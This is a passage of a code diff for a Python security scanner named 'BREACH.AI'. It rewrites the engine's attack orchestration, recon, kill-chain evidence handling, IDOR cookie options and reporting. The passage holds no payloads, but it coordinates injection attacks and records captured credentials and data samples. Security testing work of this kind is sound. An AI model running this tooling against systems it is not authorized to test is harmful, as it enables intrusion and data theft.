-                findings_after = len(self.state.findings)
-
-                # Learn from this attack
-                if learning:
-                    success = findings_after > findings_before
-                    self._learn_from_attack(learning, Mod.__name__, success)
-
-                # Fire callbacks for new findings
-                for finding in self.state.findings[findings_before:]:
-                    await self._fire_finding(finding)
-
-            except Exception as e:
-                console.print(f"[dim]  {Mod.__name__}: {e}[/dim]")
-
-        # PHASE 4: Full injection attack suite (SQLi, XSS, SSRF, NoSQL, etc.)
-        if self.deep_mode:
-            console.print(f"\n[bold cyan]▶ PHASE 4: INJECTION ATTACKS (Deep Mode)[/bold cyan]")
-            try:
-                from backend.breach.attacks.orchestrator import AttackOrchestrator
-                orchestrator = AttackOrchestrator(self.session, self.state)
-                findings_before = len(self.state.findings)
-                await orchestrator.run(cookies, cookies2)
-
-                # Fire callbacks for new findings
-                for finding in self.state.findings[findings_before:]:
-                    await self._fire_finding(finding)
-
-            except Exception as e:
-                console.print(f"[dim]  Injection attacks failed: {e}[/dim]")
-                import traceback
-                traceback.print_exc()
-
-    def _extract_tech_list(self) -> List[str]:
-        """Extract technology list from fingerprint."""
-        tech = []
-        fp = self.state.fingerprint
-        if fp.framework: tech.append(fp.framework)
-        if fp.auth_provider: tech.append(fp.auth_provider)
-        if fp.database: tech.append(fp.database)
-        if fp.payment_provider: tech.append(fp.payment_provider)
-        if fp.hosting: tech.append(fp.hosting)
-        return tech
-
-    def _learn_from_attack(self, learning, attack_name: str, success: bool):
-        """Learn from an attack attempt."""
-        try:
-            learning.learn_from_attack(
-                attack_type=attack_name,
-                payload="",  # We don't track individual payloads at this level
-                target=self.state.target,
-                target_tech=self._detected_tech,
-                success=success,
-                waf_type=self._detected_waf,
-            )
-        except Exception as e:
-            console.print(f"[dim]Learning failed: {e}[/dim]")
-
-    def _convert_v2_findings(self, breach_session):
-        """Convert V2 BreachSession findings to V1 Finding format."""
-        try:
-            from backend.breach.core.killchain import EvidenceType
-
-            for evidence in breach_session.evidence_collected:
-                # Map evidence type to severity
-                severity_map = {
-                    EvidenceType.DATA_SAMPLE: Severity.CRITICAL,
-                    EvidenceType.CREDENTIAL: Severity.CRITICAL,
-                    EvidenceType.ACCESS_PROOF: Severity.HIGH,
-                    EvidenceType.SCREENSHOT: Severity.MEDIUM,
-                    EvidenceType.LOG_ENTRY: Severity.LOW,
-                    EvidenceType.COMMAND_OUTPUT: Severity.MEDIUM,
-                }
-                severity = severity_map.get(evidence.type, Severity.MEDIUM)
-
-                finding = Finding(
-                    severity=severity,
-                    category=f"killchain_{evidence.phase.value}" if evidence.phase else "killchain",
-                    title=evidence.description or f"Evidence: {evidence.type.value}",
-                    description=f"Kill chain evidence from phase: {evidence.phase.display_name if evidence.phase else 'unknown'}",
-                    endpoint=evidence.source or self.state.target,
-                    method="GET",
-                    evidence=evidence.data,
-                    business_impact=50000 if severity == Severity.CRITICAL else 15000,
-                    impact_explanation="Kill chain breach evidence",
-                )
-                self.state.findings.append(finding)
-        except Exception as e:
-            console.print(f"[dim]V2 conversion failed: {e}[/dim]")
-
-    def _learn_from_v2_session(self, learning, breach_session):
-        """Learn from a V2 kill chain session."""
-        try:
-            # Learn from each successful step
-            for step in breach_session.get_successful_steps():
-                learning.learn_from_attack(
-                    attack_type=step.module_name,
-                    payload=step.action,
-                    target=self.state.target,
-                    target_tech=self._detected_tech,
-                    success=True,
-                    impact=f"access_{breach_session.highest_access.value}",
-                )
-
-            # Learn from evidence as vulnerabilities
-            for evidence in breach_session.evidence_collected:
-                learning.learn_from_vulnerability(
-                    vuln_type=f"killchain_{evidence.type.value}" if hasattr(evidence, 'type') else "killchain_evidence",
-                    target=self.state.target,
-                    target_tech=self._detected_tech,
-                    severity="critical" if breach_session.breach_achieved else "high",
-                )
-
-            learning.save()
-        except Exception as e:
-            console.print(f"[dim]V2 learning failed: {e}[/dim]")
-
-    def _parse(self, c):
-        if not c: return {}
         cookies = {}
-        for p in c.split(';'):
-            if '=' in p:
-                k, v = p.strip().split('=', 1)
-                cookies[k] = v
+        for part in cookie_str.split(';'):
+            if '=' in part:
+                key, value = part.strip().split('=', 1)
+                cookies[key.strip()] = value.strip()
+
         return cookies
 
-    async def _recon(self, cookies):
-        for ep in ['/', '/api/health', '/api/plans', '/api/auth/session', '/api/user', '/api/projects']:
-            url = urljoin(self.state.target, ep)
-            try:
-                async with self.session.get(url, cookies=cookies, ssl=False, timeout=10) as resp:
-                    if resp.status == 200:
-                        body = await resp.text()
-                        if len(body) > 20 and '<html' not in body.lower()[:100]:
-                            self.state.valid_endpoints.append(ep)
-                            console.print(f"[green]  ✓ {ep}[/green] ({len(body)}b)")
-                            self.state.extracted_ids.update(Patterns.UUID.findall(body)[:20])
-                            self.state.fingerprint.uuids.update(Patterns.UUID.findall(body)[:20])
-                    elif resp.status == 401:
-                        self.state.protected_endpoints.append(ep)
-            except: pass
-        console.print(f"[dim]  {len(self.state.extracted_ids)} IDs extracted[/dim]")
+    def _convert_finding(self, deep_finding) -> Finding:
+        """Convert deep scan finding to old Finding format."""
+        severity_map = {
+            "CRITICAL": Severity.CRITICAL,
+            "HIGH": Severity.HIGH,
+            "MEDIUM": Severity.MEDIUM,
+            "LOW": Severity.LOW,
+            "INFO": Severity.INFO,
+        }
 
-    def _banner(self, target, c1, c2):
-        auth_mode = "Two-User IDOR" if c2 else ("Auth" if c1 else "Unauth")
-        scan_mode = self.mode.value.upper()
-        mode_color = {"QUICK": "cyan", "DEEP": "yellow", "CHAINBREAKER": "magenta"}[scan_mode]
-        console.print(Panel.fit(
-            f"[bold red]BREACH.AI[/bold red]\n[dim]THE UNIFIED ENGINE (V1 + V2)[/dim]\n\n"
-            f"Target: {target}\n"
-            f"Auth: {auth_mode}\n"
-            f"Mode: [{mode_color}]{scan_mode}[/{mode_color}]",
-            border_style="red"
-        ))
+        return Finding(
+            severity=severity_map.get(deep_finding.severity, Severity.MEDIUM),
+            category=deep_finding.category,
+            title=deep_finding.title,
+            description=deep_finding.description,
+            endpoint=deep_finding.endpoint,
+            method=deep_finding.method,
+            evidence=deep_finding.evidence or deep_finding.raw_response[:500] if hasattr(deep_finding, 'raw_response') else None,
+            records_exposed=deep_finding.data_exposed.get('total_records', 0) if deep_finding.data_exposed else 0,
+            pii_fields=deep_finding.data_exposed.get('pii_fields', []) if deep_finding.data_exposed else [],
+            business_impact=deep_finding.business_impact,
+            impact_explanation=deep_finding.impact_explanation,
+            curl_command=deep_finding.curl_command,
+            fix_suggestion=deep_finding.remediation,
+        )
 
-    def _show_fp(self):
-        fp = self.state.fingerprint
-        t = Table(box=box.ROUNDED, title="Stack")
-        t.add_column("Component", style="cyan"); t.add_column("Detected", style="green")
-        t.add_row("Framework", fp.framework or "?")
-        t.add_row("Auth", fp.auth_provider or "?")
-        t.add_row("Database", fp.database or "?")
-        t.add_row("Payments", fp.payment_provider or "?")
-        t.add_row("Hosting", fp.hosting or "?")
-        if fp.supabase_url: t.add_row("Supabase", fp.supabase_url[:40] + "...")
-        if fp.stripe_pk: t.add_row("Stripe", fp.stripe_pk[:30] + "...")
-        console.print(t)
+    def json_report(self) -> str:
+        """Generate JSON report."""
+        if not self._result:
+            return json.dumps({})
 
-    def _report(self):
-        elapsed = time.time() - self.start_time
-        f = self.state.findings
-        crit = len([x for x in f if x.severity == Severity.CRITICAL])
-        high = len([x for x in f if x.severity == Severity.HIGH])
-        med = len([x for x in f if x.severity == Severity.MEDIUM])
-        impact = sum(x.business_impact for x in f)
-        console.print(f"\n{'═'*70}")
-        if crit: console.print(f"[bold red]🔴 {crit} CRITICAL[/bold red]")
-        if high: console.print(f"[yellow]🟡 {high} HIGH[/yellow]")
-        if med: console.print(f"[blue]🔵 {med} MEDIUM[/blue]")
-        if impact: console.print(f"\n[bold]💰 IMPACT: ${impact:,}[/bold]")
-        console.print(f"{'═'*70}\n")
-        t = Table(box=box.ROUNDED, title="Summary")
-        t.add_column("Metric", style="cyan"); t.add_column("Value")
-        t.add_row("Time", f"{elapsed:.1f}s")
-        t.add_row("IDs Found", str(len(self.state.extracted_ids)))
-        t.add_row("Findings", str(len(f)))
-        t.add_row("Critical", f"[red]{crit}[/red]")
-        t.add_row("Impact", f"[bold]${impact:,}[/bold]")
-        console.print(t)
-        if f:
-            console.print(f"\n[bold]FINDINGS:[/bold]")
-            for i, x in enumerate(sorted(f, key=lambda x: x.severity.value, reverse=True), 1):
-                col = {Severity.CRITICAL: 'red bold', Severity.HIGH: 'yellow', Severity.MEDIUM: 'blue'}.get(x.severity, 'dim')
-                console.print(f"\n  {i}. [{col}][{x.severity.name}][/{col}] {x.title}")
-                console.print(f"     {x.description}")
-                if x.records_exposed: console.print(f"     [red]Records: {x.records_exposed}[/red]")
-                if x.pii_fields: console.print(f"     [red]PII: {', '.join(x.pii_fields[:3])}[/red]")
-                console.print(f"     [green]💰 ${x.business_impact:,}[/green]")
-                console.print(f"     [dim]{x.curl_command[:70]}...[/dim]")
-                if x.fix_suggestion: console.print(f"     [cyan]Fix: {x.fix_suggestion}[/cyan]")
-        console.print(f"\n{'═'*70}\n")
+        return json.dumps({
+            'target': self.state.target,
+            'duration_seconds': self.state.duration_seconds,
+            'pages_crawled': self.state.pages_crawled,
+            'endpoints_found': self.state.endpoints_found,
+            'findings': [
+                {
+                    'severity': f.severity.name,
+                    'category': f.category,
+                    'title': f.title,
+                    'description': f.description,
+                    'endpoint': f.endpoint,
+                    'business_impact': f.business_impact,
+                    'curl_command': f.curl_command,
+                    'fix': f.fix_suggestion,
+                }
+                for f in self.state.findings
+            ],
+            'summary': {
+                'total_findings': len(self.state.findings),
+                'critical': len([f for f in self.state.findings if f.severity == Severity.CRITICAL]),
+                'high': len([f for f in self.state.findings if f.severity == Severity.HIGH]),
+                'medium': len([f for f in self.state.findings if f.severity == Severity.MEDIUM]),
+                'low': len([f for f in self.state.findings if f.severity == Severity.LOW]),
+                'total_impact': sum(f.business_impact for f in self.state.findings),
+            }
+        }, indent=2)
 
-    def json_report(self):
-        return json.dumps({'target': self.state.target, 'findings': [{'severity': f.severity.name, 'title': f.title, 'endpoint': f.endpoint, 'impact': f.business_impact} for f in self.state.findings], 'total_impact': sum(f.business_impact for f in self.state.findings)}, indent=2)
 
 async def main():
+    """CLI entry point."""
     import argparse
-    p = argparse.ArgumentParser(description='BREACH.AI - THE UNIFIED ENGINE (V1 + V2)')
-    p.add_argument('target', help='Target URL')
-    p.add_argument('--cookie', '--cookie1', dest='cookie', help='Cookie 1')
-    p.add_argument('--cookie2', help='Cookie 2 (IDOR)')
-    p.add_argument('--token', help='Bearer token')
-    p.add_argument('--mode', choices=['quick', 'deep', 'chainbreaker'], default='quick',
-                   help='Scan mode: quick (V1 SaaS), deep (V1+injections), chainbreaker (V2 kill chain)')
-    p.add_argument('--deep', action='store_true', help='Shortcut for --mode deep')
-    p.add_argument('--chainbreaker', action='store_true', help='Shortcut for --mode chainbreaker')
-    p.add_argument('--timeout', type=int, default=1, help='Timeout in hours (for chainbreaker mode)')
-    p.add_argument('--output', '-o', help='JSON output')
-    args = p.parse_args()
 
-    # Determine mode
-    mode = args.mode
-    if args.chainbreaker:
-        mode = 'chainbreaker'
-    elif args.deep:
-        mode = 'deep'
+    parser = argparse.ArgumentParser(description='BREACH.AI - GOD LEVEL Security Scanner')
+    parser.add_argument('target', help='Target URL')
+    parser.add_argument('--cookie', '--cookie1', dest='cookie', help='Session cookie')
+    parser.add_argument('--cookie2', help='Second user cookie for IDOR testing')
+    parser.add_argument('--token', help='Bearer token')
+    parser.add_argument('--output', '-o', help='Output JSON file')
+    # Legacy args - ignored
+    parser.add_argument('--mode', help='Ignored - always deep')
+    parser.add_argument('--deep', action='store_true', help='Ignored - always deep')
+    parser.add_argument('--quick', action='store_true', help='Ignored - always deep')
+    parser.add_argument('--chainbreaker', action='store_true', help='Ignored - always deep')
+    parser.add_argument('--timeout', type=int, default=1, help='Timeout in hours')
 
-    async with BreachEngine(mode=mode, timeout_hours=args.timeout) as e:
-        await e.breach(args.target, args.cookie, args.cookie2, args.token)
+    args = parser.parse_args()
+
+    console.print(f"\n[bold red]BREACH.AI[/bold red] - [bold yellow]GOD LEVEL[/bold yellow] Security Scanner\n")
+
+    async with BreachEngine(timeout_hours=args.timeout) as engine:
+        await engine.breach(
+            target=args.target,
+            cookie=args.cookie,
+            cookie2=args.cookie2,
+            token=args.token,
+        )
+
         if args.output:
-            open(args.output, 'w').write(e.json_report())
-            console.print(f"[green]Saved: {args.output}[/green]")
+            with open(args.output, 'w') as f:
+                f.write(engine.json_report())
+            console.print(f"\n[green]Report saved to: {args.output}[/green]")
+
 
 if __name__ == '__main__':
     asyncio.run(main())
